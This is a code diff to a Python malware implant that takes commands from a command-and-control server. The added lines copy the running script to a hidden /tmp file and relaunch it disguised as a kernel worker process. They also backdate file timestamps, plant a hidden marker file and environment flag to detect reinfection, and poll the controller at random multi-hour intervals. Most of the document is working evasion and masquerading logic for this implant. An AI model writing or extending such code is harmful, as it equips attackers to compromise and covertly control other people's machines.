@@ -13,10 +13,10 @@ import time
 import random
 import pathlib
 
-
+#TODO signed packets, not passwords
 password = "password"
 HOST, PORT = "0.0.0.0", 9998
-
+debug = True
 
 def handle(data):
     """Handle incoming commands from C2
@@ -147,21 +147,23 @@ def become_silent():
     p = psutil.Process(os.getpid())
     cmdline = p.cmdline()[1]
 
-    if check_mark(cmdline):
+    #TODO randomize names, dependant on parent
+    hidden, bandit = "/tmp/.mem_systemd", "[kworker/2:0-events]"
+    print(cmdline)
+    if not check_mark() and cmdline != hidden:
+        leave_mark()
         print("No presence detected, going in...")
-        #TODO randomize names
-        hidden, bandit = "/tmp/.mem_buffer", "[kworker/2:0-events]"
+
         shutil.copyfile(cmdline, hidden)
         cmd = subprocess.run(["/bin/chmod", "+x",  f"{hidden}"])
         cmd = subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {p.exe()} {hidden} &\""))
         cmd = subprocess.run(["/bin/chmod", "-x",  f"{hidden}"])
         randomize_timestamp(hidden)
+        exit(0)
     else:
-        #leave_mark()
-        print("Hidden")
-        print(os.getpid())
-        while 1:
-            continue
+        leave_mark()
+        # Should die if already on system
+        exit(0)
 
 def randomize_timestamp(file):
     set_stamp = time.time() - random.randrange(15778463 ,31556926)
@@ -174,29 +176,51 @@ def leave_mark():
     randomize_timestamp(f"{str(pathlib.Path.home())}/.zshconf")
     os.environ["BASH"] = "1"
 
-def check_mark(cmdline):
-    if "tmp" not in cmdline:
+def check_mark():
+    if os.path.isfile(f"{str(pathlib.Path.home())}/.zshconf"):
         return True
-    # if os.path.isfile("~/.zshconfig"):
-    #     return True
-    # if os.environ.get("BASH") == "1":
-    #     return True
+    if os.environ.get("BASH") == "1":
+        return True
     return False
 
 
 def delay_for_mode():
+    """Generate delay appropraite to mode
+
+        Active - 30 seconds
+        Passive - between 6 and 18 hours
+    """
+
     if check_active():
-        time.sleep(30)
+        delay = 30 
     else:
-        time.sleep(random.randrange(21600, 64800))
+        delay = random.randrange(21600, 64800)
+    print(f"Delaying for {delay}s...")
+    time.sleep(delay)
 
 if __name__ == "__main__":
+
+    if debug:
+        try:    
+            os.remove(f"{str(pathlib.Path.home())}/.zshconf")
+            os.environ["BASH"] = "0"
+        except FileNotFoundError:
+            pass
     upgrade_shell()
     become_silent()
 
+    last_commands = ""
+
     while 1:
-        delay_for_mode()
         cmds = request_commands()
 
-        for cmd in cmds:
-            handle(cmd.split(":"))
+        cmdhash = hashlib.md5(''.join(cmds).encode('utf-8')).hexdigest()
+
+        if last_commands != cmdhash:
+            for cmd in cmds:
+                handle(cmd.split(":"))
+            last_commands = cmdhash
+        else:
+            print("No change from C2")
+        
+        delay_for_mode()
